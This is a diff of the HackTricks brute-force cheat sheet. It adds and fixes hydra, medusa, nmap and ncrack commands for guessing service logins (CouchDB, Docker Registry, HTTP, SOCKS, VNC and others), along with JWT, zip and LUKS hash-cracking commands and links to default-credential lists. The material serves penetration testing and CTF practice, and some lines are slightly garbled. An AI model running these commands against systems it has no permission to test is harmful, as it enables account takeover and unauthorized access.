@@ -1,18 +1,27 @@
 # Brute Force - CheatSheet
 
+{% hint style="danger" %}
+Do you use **Hacktricks every day**? Did you find the book **very** **useful**? Would you like to **receive extra help** with cybersecurity questions? Would you like to **find more and higher quality content on Hacktricks**?  
+[**Support Hacktricks through github sponsors**](https://github.com/sponsors/carlospolop) **so we can dedicate more time to it and also get access to the Hacktricks private group where you will get the help you need and much more!**
+{% endhint %}
+
+If you want to know about my **latest modifications**/**additions** or you have **any suggestion for HackTricks** or **PEASS**, **join the** [**💬**](https://emojipedia.org/speech-balloon/)[**telegram group**](https://t.me/peass), or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**  
+If you want to **share some tricks with the community** you can also submit **pull requests** to [**https://github.com/carlospolop/hacktricks**](https://github.com/carlospolop/hacktricks) that will be reflected in this book and don't forget to **give ⭐** on **github** to **motivate** **me** to continue developing this book.
+
 ## Default Credentials
 
 **Search in google** for default credentials of the technology that is being used, or **try this links**:
 
-* \*\*\*\*[**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)\*\*\*\*
-* \*\*\*\*[**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)\*\*\*\*
-* \*\*\*\*[**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)\*\*\*\*
-* \*\*\*\*[**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)\*\*\*\*
-* \*\*\*\*[**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)\*\*\*\*
-* \*\*\*\*[**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)\*\*\*\*
-* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)\*\*\*\*
-* \*\*\*\*[**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)\*\*\*\*
-* \*\*\*\*[**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com/)\*\*\*\*
+* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
+* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
+* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
+* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
+* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
+* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
+* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
+* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
+* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
+* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com/)
 
 ## **Create your own Dictionaries**
 
@@ -20,7 +29,7 @@ Find as much information about the target as you can and generate a custom dicti
 
 ### Crunch
 
-```text
+```bash
 crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
 crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)
 
@@ -49,11 +58,11 @@ python3 cupp.py -h
 
 ### Wordlists
 
-* \*\*\*\*[**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)\*\*\*\*
-* \*\*\*\*[**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)\*\*\*\*
-* \*\*\*\*[**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)\*\*\*\*
-* \*\*\*\*[**https://github.com/google/fuzzing/tree/master/dictionaries**](%20https://github.com/google/fuzzing/tree/master/dictionaries)\*\*\*\*
-* \*\*\*\*[**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)\*\*\*\*
+* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
+* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
+* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
+* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/carlospolop/hacktricks/tree/95b16dc7eb952272459fc877e4c9d0777d746a16/google/fuzzing/tree/master/dictionaries/README.md)
+* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
 
 ## Services
 
@@ -87,13 +96,19 @@ nmap --script cassandra-brute -p 9160 <IP>
 
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
-hydra /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
+```
+
+### Docker Registry
+
+```text
+hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
 
 ### Elasticsearch
 
 ```text
-hydra /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 
 ### FTP
@@ -106,12 +121,13 @@ medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 
 ### HTTP Generic Brute
 
-#### [**WFuzz**](pentesting-web/web-tool-wfuzz.md)\*\*\*\*
+#### [**WFuzz**](pentesting-web/web-tool-wfuzz.md)
 
 ### HTTP Basic Auth
 
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
+# Use https-get mode for httpS
 medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
 ```
 
@@ -119,6 +135,7 @@ medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -
 
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
+# Use https-post-form mode for httpS
 ```
 
 For http**s** you have to change from "http-post-form" to "**https-post-form"**
@@ -147,6 +164,31 @@ nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,
 
 ```bash
 nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
+```
+
+### JWT
+
+```bash
+#hashcat
+hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt
+
+#https://github.com/Sjord/jwtcrack
+python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
+
+#John
+john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256
+
+#https://github.com/ticarpi/jwt_tool
+python3 jwt_tool.py -d wordlists.txt <JWT token>
+
+#https://github.com/brendan-rius/c-jwt-cracker
+./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8
+
+#https://github.com/mazen160/jwt-pwn
+python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt
+
+#https://github.com/lmammino/jwt-cracker
+jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
 ```
 
 ### LDAP
@@ -232,7 +274,7 @@ sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```
 
-### RDP 
+### RDP
 
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
@@ -302,6 +344,12 @@ hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
 ```
 
+### SOCKS
+
+```bash
+nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
+```
+
 ### SQL Server
 
 ```bash
@@ -333,9 +381,9 @@ medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
 
 ```bash
 hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
-medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
+medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
 ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
-patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
+patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
 nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
 ```
 
@@ -358,6 +406,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 * [https://www.cmd5.org/](https://www.cmd5.org/) \(Hashes\)
 * [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) \(MD5, NTLM, SHA1, MySQL5, SHA256, SHA512\)
 * [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) \(MD5\)
+* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com/)
 
 Check this out before trying to bruteforce a Hash.
 
@@ -370,6 +419,12 @@ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
 ```bash
 zip2john file.zip > zip.john
 john zip.john
+```
+
+```bash
+#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
+hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
+.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
 
 ### 7z
@@ -454,7 +509,7 @@ mount /dev/mapper/mylucksopen /mnt
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
-hashcat -m 14600 luckshash 
+hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
 cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
@@ -521,6 +576,4 @@ Cracking Common Application Hashes
  1400 | SHA-256                                          | Raw Hash
  1700 | SHA-512                                          | Raw Hash
 ```
-
-
 
